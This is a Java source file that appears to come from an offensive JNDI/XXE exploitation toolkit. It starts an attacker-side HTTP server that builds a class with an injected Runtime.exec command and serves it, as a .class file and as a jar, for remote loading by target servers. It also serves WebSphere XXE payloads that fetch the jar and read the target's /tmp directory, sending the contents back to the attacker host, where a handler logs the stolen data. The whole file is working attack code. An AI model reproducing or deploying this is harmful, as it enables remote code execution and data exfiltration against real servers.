package artsploit;

import com.sun.net.httpserver.HttpExchange;
import com.sun.net.httpserver.HttpHandler;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import org.apache.commons.lang3.reflect.FieldUtils;

import java.io.ByteArrayOutputStream;
import java.net.InetSocketAddress;
import java.util.concurrent.Executors;
import java.util.jar.JarOutputStream;
import java.util.zip.ZipEntry;

import static org.apache.commons.text.StringEscapeUtils.escapeJava;

public class HttpServer implements HttpHandler {

	byte[] exportByteCode;
	byte[] exportJar;

	public static void start() throws Exception {
		System.out.println("Starting HTTP server on 0.0.0.0:" + Config.httpPort);
		com.sun.net.httpserver.HttpServer httpServer = com.sun.net.httpserver.HttpServer.create(new InetSocketAddress(Config.httpPort), 10);
		httpServer.createContext("/", new HttpServer());
		httpServer.setExecutor(Executors.newCachedThreadPool());
		httpServer.start();
	}

	public HttpServer() throws Exception {
		exportByteCode = patchBytecode(ExportObject.class, Config.command, "xExportObject");
		exportJar = createJar(exportByteCode, "xExportObject");
	}

	/**
	 * Patch the bytecode of supplied class constructor by injecting execution of a command
	 */
	byte[] patchBytecode(Class clazz, String command, String newName) throws Exception {

		//load ExploitObject.class bytecode
		ClassPool classPool = ClassPool.getDefault();
		CtClass exploitClass = classPool.get(clazz.getName());

		//patch its bytecode by adding a new command
		CtConstructor m = exploitClass.getConstructors()[0];
		m.insertBefore("{ Runtime.getRuntime().exec(\"" +  escapeJava(command) + "\"); }");
		exploitClass.setName(newName);
		exploitClass.detach();
		return exploitClass.toBytecode();
	}

	/**
	 * Create an executable jar based on supplied bytecode
	 */
	byte[] createJar(byte[] exportByteCode, String className) throws Exception {

		ByteArrayOutputStream bout = new ByteArrayOutputStream();
		JarOutputStream jarOut = new JarOutputStream(bout);
		jarOut.putNextEntry(new ZipEntry(className + ".class"));
		jarOut.write(exportByteCode);
		jarOut.closeEntry();
		jarOut.close();
		bout.close();

		return bout.toByteArray();
	}

	public void handle(HttpExchange httpExchange) {
		try {
			String path = httpExchange.getRequestURI().getPath();
			System.out.println("new http request from " + httpExchange.getRemoteAddress() + " asking for " + path);

			switch (path) {
				case "/xExportObject.class":
					//send xExportObject bytecode back to client
					httpExchange.sendResponseHeaders(200, exportByteCode.length);
					httpExchange.getResponseBody().write(exportByteCode);
					break;

				case "/xExportObject.jar":
					//send xExportObject bytecode in a jar archive
					//payload for artsploit.controllers.WebSphere1-2
					httpExchange.sendResponseHeaders(200, exportJar.length+1);
					httpExchange.getResponseBody().write(exportJar);
					System.out.println("Stalling connection for 60 seconds");
					Thread.sleep(60000);
					System.out.println("Release stalling...");
					break;

				case "/upload.wsdl":
					//payload for artsploit.controllers.WebSphere1-2
					//intended to upload xExploitObject.jar into the /temp directory on server
					String uploadWsdl = "<!DOCTYPE a SYSTEM \"jar:http://" + Config.hostname + ":" + Config.httpPort +
							"/xExploitObject.jar!/file.txt\"><a></a>";
					httpExchange.sendResponseHeaders(200, uploadWsdl.getBytes().length);
					httpExchange.getResponseBody().write(uploadWsdl.getBytes());
					break;

				case "/xx.http":
					//payload for artsploit.controllers.WebSphere1-2
					//second part for upload.wsdl
					String xxhttp = "<!ENTITY % ccc '<!ENTITY ddd &#39;<import namespace=\"uri\" location=\"http://" +
							Config.hostname + ":" + Config.httpPort + "/xxeLog?%aaa;\"/>&#39;>'>%ccc;";
					httpExchange.sendResponseHeaders(200, xxhttp.getBytes().length);
					httpExchange.getResponseBody().write(xxhttp.getBytes());
					break;

				case "/list.wsdl":
					//payload for artsploit.controllers.WebSphere1-2
					//intended to list files in the /temp directory on server
					String listWsdl = "" +
							"<!DOCTYPE x [\n" +
							"  <!ENTITY % aaa SYSTEM \"file:///tmp/\">\n" +
							"  <!ENTITY % bbb SYSTEM \"http://" + Config.hostname + ":" + Config.httpPort + "/xx.http\">\n" +
							"  %bbb;\n" +
							"]>\n" +
							"<definitions name=\"HelloService\" xmlns=\"http://schemas.xmlsoap.org/wsdl/\">\n" +
							"  &ddd;\n" +
							"</definitions>";

					httpExchange.sendResponseHeaders(200, listWsdl.getBytes().length);
					httpExchange.getResponseBody().write(listWsdl.getBytes());
					break;

				case "/xxeLog":
					//xxe logger for websphere wsdl payloads
					//hacky way to access private fields of (Request)((ExchangeImpl)((HttpExchangeImpl)httpExchange).impl).req
					Object exchangeImpl = FieldUtils.readField(httpExchange, "impl", true);
					Object request = FieldUtils.readField(exchangeImpl, "req", true);
					String startLine = (String) FieldUtils.readField(request, "startLine", true);

					System.out.println("\u001B[31mxxe attack result: " + startLine + "\u001B[0m");
					httpExchange.sendResponseHeaders(200, 0);
					break;

				default:
					httpExchange.sendResponseHeaders(200, 0);
			}
			httpExchange.close();
		} catch(Exception e) {
			e.printStackTrace();
		}
	}
}
